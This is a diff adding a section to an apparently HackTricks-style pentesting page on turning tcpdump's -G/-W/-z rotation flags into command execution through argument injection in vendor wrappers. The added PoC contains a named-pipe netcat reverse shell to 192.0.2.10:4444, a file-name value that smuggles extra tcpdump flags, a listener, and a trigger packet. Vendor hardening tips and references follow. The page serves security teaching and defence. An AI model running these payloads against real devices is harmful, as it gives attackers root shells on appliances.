@@ -120,6 +120,52 @@ These primitives are less common than the *tar/rsync/zip* classics but worth che
 
 ---
 
+## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers
+
+When a restricted shell or vendor wrapper builds a `tcpdump` command line by concatenating user-controlled fields (e.g., a "file name" parameter) without strict quoting/validation, you can smuggle extra `tcpdump` flags. The combo of `-G` (time-based rotation), `-W` (limit number of files), and `-z <cmd>` (post-rotate command) yields arbitrary command execution as the user running tcpdump (often root on appliances).
+
+Preconditions:
+
+- You can influence `argv` passed to `tcpdump` (e.g., via a wrapper like `/debug/tcpdump --filter=... --file-name=<HERE>`).
+- The wrapper does not sanitize spaces or `-`-prefixed tokens in the file name field.
+
+Classic PoC (executes a reverse shell script from a writable path):
+
+```sh
+# Reverse shell payload saved on the device (e.g., USB, tmpfs)
+cat > /mnt/disk1_1/rce.sh <<'EOF'
+#!/bin/sh
+rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
+EOF
+chmod +x /mnt/disk1_1/rce.sh
+
+# Inject additional tcpdump flags via the unsafe "file name" field
+/debug/tcpdump --filter="udp port 1234" \
+  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"
+
+# On the attacker host
+nc -6 -lvnp 4444 &
+# Then send any packet that matches the BPF to force a rotation
+printf x | nc -u -6 [victim_ipv6] 1234
+```
+
+Details:
+
+- `-G 1 -W 1` forces an immediate rotate after the first matching packet.
+- `-z <cmd>` runs the post-rotate command once per rotation. Many builds execute `<cmd> <savefile>`. If `<cmd>` is a script/interpreter, ensure the argument handling matches your payload.
+
+No-removable-media variants:
+
+- If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /bin/sh /path/script.sh` or `-z /path/script.sh` depending on platform semantics.
+- Some vendor wrappers rotate to attacker-controllable locations. If you can influence the rotated path (symlink/directory traversal), you can steer `-z` to execute content you fully control without external media.
+
+Hardening tips for vendors:
+
+- Never pass user-controlled strings directly to `tcpdump` (or any tool) without strict allowlists. Quote and validate.
+- Do not expose `-z` functionality in wrappers; run tcpdump with a fixed safe template and disallow extra flags entirely.
+- Drop tcpdump privileges (cap_net_admin/cap_net_raw only) or run under a dedicated unprivileged user with AppArmor/SELinux confinement.
+
+
 ## Detection & Hardening
 
 1. **Disable shell globbing** in critical scripts: `set -f` (`set -o noglob`) prevents wildcard expansion.
@@ -134,5 +180,7 @@ These primitives are less common than the *tar/rsync/zip* classics but worth che
 
 * Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)  
 * Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
+* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
